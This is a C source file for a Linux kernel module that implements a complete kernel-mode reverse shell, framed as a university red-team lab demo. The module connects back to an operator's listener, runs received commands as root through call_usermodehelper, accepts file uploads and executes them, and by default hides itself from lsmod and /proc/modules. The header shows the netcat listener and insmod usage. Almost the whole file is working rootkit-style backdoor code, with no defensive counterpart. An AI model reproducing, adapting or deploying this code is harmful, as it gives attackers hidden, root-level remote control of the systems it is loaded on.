/*
 * kshell.c — Kernel-mode reverse shell (educational lab demo)
 *
 * Demonstrates kernel socket API and command execution from ring 0.
 * For use in university air-gapped red team testing ranges ONLY.
 *
 * How it works:
 *   1. Module init spawns a kthread (kernel thread)
 *   2. Kthread creates a TCP socket via sock_create() — kernel API, no syscalls
 *   3. Connects back to the operator's listener via kernel_connect()
 *   4. Loop: recv command → call_usermodehelper("/bin/sh -c <cmd>") → send output
 *   5. call_usermodehelper() spawns a root userspace process from kernel context
 *
 * Usage:
 *   # On operator machine (or same VM):
 *   nc -lvp 4444
 *
 *   # Load the module:
 *   insmod kshell.ko host=127.0.0.1 port=4444
 *
 *   # Unload:
 *   rmmod kshell
 *
 * What students learn:
 *   - Kernel socket API (sock_create, kernel_connect, kernel_sendmsg, kernel_recvmsg)
 *   - Kernel threads (kthread_create, kthread_stop, kthread_should_stop)
 *   - call_usermodehelper: how the kernel spawns userspace processes
 *   - Why this is different from a userspace reverse shell
 *   - Detection: how to find kernel threads and kernel sockets
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <net/sock.h>

#include "b64_kernel.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team Lab");
MODULE_DESCRIPTION("Kernel reverse shell — educational demo");

static char *host = "127.0.0.1";
module_param(host, charp, 0444);
MODULE_PARM_DESC(host, "Connect-back IP address (default: 127.0.0.1)");

static int port = 4444;
module_param(port, int, 0444);
MODULE_PARM_DESC(port, "Connect-back port (default: 4444)");

static int persist = 0;
module_param(persist, int, 0444);
MODULE_PARM_DESC(persist, "1=stay loaded, 0=fire-and-forget (default)");

static struct task_struct *shell_thread;
static int fire_and_forget;
static struct socket *conn_sock;

/*
 * parse_ip — Convert dotted-quad string to __be32.
 */
static __be32 parse_ip(const char *ip_str)
{
    unsigned int a, b, c, d;
    if (sscanf(ip_str, "%u.%u.%u.%u", &a, &b, &c, &d) != 4)
        return htonl(INADDR_LOOPBACK);
    return htonl((a << 24) | (b << 16) | (c << 8) | d);
}

/*
 * ksend — Send a buffer over the kernel socket.
 *
 * Uses kernel_sendmsg() — the kernel's internal socket send API.
 * This does NOT go through the syscall table. It calls directly
 * into the network stack from ring 0.
 */
static int ksend(struct socket *sock, const void *buf, int len)
{
    struct msghdr msg = {};
    struct kvec iov = { .iov_base = (void *)buf, .iov_len = len };
    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

/*
 * krecv — Receive data from the kernel socket.
 *
 * Uses kernel_recvmsg() — blocks until data arrives or socket closes.
 */
static int krecv(struct socket *sock, void *buf, int len)
{
    struct msghdr msg = {};
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    return kernel_recvmsg(sock, &msg, &iov, 1, len, 0);
}

/* --- !upload handler --- */
static int cmd_upload_plain(const char *args, char *output, int output_len)
{
    const char *path_end;
    char path[256];
    const char *b64_data;
    u8 *decoded;
    int decoded_len, path_len;
    struct file *f;
    loff_t pos = 0;

    path_end = strchr(args, ' ');
    if (!path_end) {
        snprintf(output, output_len, "usage: !upload <path> <base64>\n");
        return -1;
    }
    path_len = path_end - args;
    if (path_len >= (int)sizeof(path)) path_len = sizeof(path) - 1;
    memcpy(path, args, path_len);
    path[path_len] = '\0';
    b64_data = path_end + 1;

    decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
    if (!decoded) return -ENOMEM;
    decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
    if (decoded_len < 0) { kfree(decoded); return -1; }

    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (IS_ERR(f)) { kfree(decoded); return PTR_ERR(f); }
    kernel_write(f, decoded, decoded_len, &pos);
    filp_close(f, NULL);
    kfree(decoded);

    snprintf(output, output_len, "uploaded %d bytes → %s\n", decoded_len, path);
    return 0;
}

/* --- !run handler --- */
static int cmd_run_plain(const char *args, char *output, int output_len)
{
    char *full_cmd;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    struct file *f;
    loff_t pos = 0;
    int ret;

    full_cmd = kmalloc(strlen(args) + 128, GFP_KERNEL);
    if (!full_cmd) return -ENOMEM;
    snprintf(full_cmd, strlen(args) + 128,
             "chmod +x %s 2>/dev/null; %s > /tmp/.ksh_out 2>&1", args, args);
    argv[2] = full_cmd;
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(full_cmd);

    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
    if (IS_ERR(f)) { snprintf(output, output_len, "(no output)\n"); return 0; }
    memset(output, 0, output_len);
    ret = kernel_read(f, output, output_len - 1, &pos);
    filp_close(f, NULL);
    if (ret >= 0 && ret < output_len) output[ret] = '\0';
    return ret;
}

/*
 * run_cmd — Execute a command and capture output.
 *
 * Uses call_usermodehelper() which is the kernel API for spawning
 * userspace processes. The kernel creates a new process running
 * /bin/sh -c "command", waits for it to exit, and we capture
 * the output by redirecting to a temp file.
 *
 * Key insight: call_usermodehelper runs the command as PID 1's child
 * with full root credentials. There is no permission check — the
 * kernel is the one making the request.
 */
static int run_cmd(const char *cmd, char *output, int output_len)
{
    /* Strategy: write output to a temp file, then read it back.
     *
     * call_usermodehelper doesn't give us stdout directly,
     * so we redirect: /bin/sh -c "cmd > /tmp/.ksh_out 2>&1"
     * then read /tmp/.ksh_out via kernel_read().
     */
    char *full_cmd;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    struct file *f;
    loff_t pos = 0;
    int ret;

    full_cmd = kmalloc(strlen(cmd) + 64, GFP_KERNEL);
    if (!full_cmd)
        return -ENOMEM;

    snprintf(full_cmd, strlen(cmd) + 64,
             "%s > /tmp/.ksh_out 2>&1", cmd);
    argv[2] = full_cmd;

    /* call_usermodehelper: spawn userspace process from kernel.
     *
     * UMH_WAIT_PROC: block until the process exits.
     * The process runs as root (uid 0, full capabilities).
     */
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(full_cmd);

    if (ret < 0) {
        snprintf(output, output_len, "call_usermodehelper failed: %d\n", ret);
        return ret;
    }

    /* Read the output file */
    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
    if (IS_ERR(f)) {
        snprintf(output, output_len, "(no output)\n");
        return 0;
    }

    memset(output, 0, output_len);
    ret = kernel_read(f, output, output_len - 1, &pos);
    filp_close(f, NULL);

    if (ret < 0) {
        snprintf(output, output_len, "(read error: %d)\n", ret);
        return ret;
    }

    /* Ensure null-terminated */
    if (ret < output_len)
        output[ret] = '\0';

    return ret;
}

/*
 * shell_loop — Main shell thread function.
 *
 * This runs as a kthread — a kernel thread that appears in ps/top
 * as [kshell] (or whatever the kthread name is). It runs entirely
 * in kernel context (ring 0).
 *
 * The loop:
 *   1. Create socket (kernel API, not syscall)
 *   2. Connect to operator
 *   3. Send banner
 *   4. Recv command → execute → send output
 *   5. Repeat until socket closes or module unloads
 */
static int shell_loop(void *data)
{
    struct sockaddr_in addr;
    char *recv_buf = NULL;
    char *output_buf = NULL;
    int ret, len;
    const char *banner = "\n[kshell] kernel reverse shell active (ring 0)\n"
                         "[kshell] type commands, output via call_usermodehelper\n"
                         "[kshell] type 'exit' to disconnect\n\n# ";

    recv_buf = kmalloc(1024 * 1024, GFP_KERNEL); /* 1MB for file uploads */
    output_buf = kmalloc(65536, GFP_KERNEL);
    if (!recv_buf || !output_buf)
        goto out;

    /* --- Step 1: Create TCP socket --- */
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
    if (ret < 0) {
        pr_debug("kshell: sock_create failed: %d\n", ret);
        goto out;
    }
    pr_debug("kshell: socket created\n");

    /* --- Step 2: Connect back to operator --- */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = parse_ip(host);

    pr_debug("kshell: connecting to %s:%d\n", host, port);

    /* Retry loop — operator may not have listener ready yet */
    while (1) {
        if (!fire_and_forget && kthread_should_stop()) goto out_sock;
        ret = kernel_connect(conn_sock, (struct sockaddr *)&addr,
                            sizeof(addr), 0);
        if (ret == 0)
            break;
        pr_debug("kshell: connect failed (%d), retrying in 3s...\n", ret);
        ssleep(3);
    }

    pr_debug("kshell: connected!\n");

    /* --- Step 3: Send banner --- */
    ksend(conn_sock, banner, strlen(banner));

    /* --- Step 4: Command loop --- */
    while (1) {
        if (!fire_and_forget && kthread_should_stop()) break;
        memset(recv_buf, 0, 4096);
        len = krecv(conn_sock, recv_buf, 4095);

        if (len <= 0) {
            pr_debug("kshell: connection closed (recv=%d)\n", len);
            break;
        }

        /* Strip trailing newline */
        while (len > 0 && (recv_buf[len-1] == '\n' || recv_buf[len-1] == '\r'))
            recv_buf[--len] = '\0';

        if (len == 0) {
            ksend(conn_sock, "# ", 2);
            continue;
        }

        /* Check for exit command */
        if (strcmp(recv_buf, "exit") == 0) {
            ksend(conn_sock, "[kshell] disconnecting\n", 23);
            break;
        }

        /* Dispatch command */
        pr_debug("kshell: cmd: %s\n", recv_buf);
        memset(output_buf, 0, 65536);

        if (strncmp(recv_buf, "!upload ", 8) == 0)
            cmd_upload_plain(recv_buf + 8, output_buf, 65536);
        else if (strncmp(recv_buf, "!run ", 5) == 0)
            cmd_run_plain(recv_buf + 5, output_buf, 65536);
        else
            run_cmd(recv_buf, output_buf, 65536);

        /* Send output back */
        len = strlen(output_buf);
        if (len > 0)
            ksend(conn_sock, output_buf, len);

        /* Send prompt */
        ksend(conn_sock, "# ", 2);
    }

out_sock:
    if (conn_sock) {
        sock_release(conn_sock);
        conn_sock = NULL;
    }
out:
    kfree(recv_buf);
    kfree(output_buf);
    pr_debug("kshell: thread exiting\n");
    return 0;
}

static int __init kshell_init(void)
{
    pr_debug("kshell: loading (target %s:%d)\n", host, port);

    /* Spawn the shell loop as a kernel thread.
     *
     * kthread_run() creates and starts the thread immediately.
     * The thread name appears in ps/top as [kshell].
     * It runs in kernel context with full ring 0 privileges.
     */
    fire_and_forget = !persist;

    shell_thread = kthread_run(shell_loop, NULL, "kshell");
    if (IS_ERR(shell_thread)) {
        pr_debug("kshell: kthread_run failed: %ld\n",
                PTR_ERR(shell_thread));
        shell_thread = NULL;
        return PTR_ERR(shell_thread);
    }

    pr_debug("kshell: thread started (PID %d)\n", shell_thread->pid);

    if (!persist) {
        /* Stealth: hide from lsmod but keep module loaded
         * (kthread code lives in module .text — can't unload) */
        list_del_init(&THIS_MODULE->list);
        pr_debug("kshell: hidden from /proc/modules\n");
    }

    return 0;
}

static void __exit kshell_exit(void)
{
    pr_debug("kshell: unloading\n");

    if (shell_thread) {
        kthread_stop(shell_thread);
        shell_thread = NULL;
    }

    if (conn_sock) {
        sock_release(conn_sock);
        conn_sock = NULL;
    }

    /* Clean up temp file */
    {
        char *argv[] = { "/bin/rm", "-f", "/tmp/.ksh_out", NULL };
        char *envp[] = { "HOME=/", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    pr_debug("kshell: unloaded\n");
}

module_init(kshell_init);
module_exit(kshell_exit);
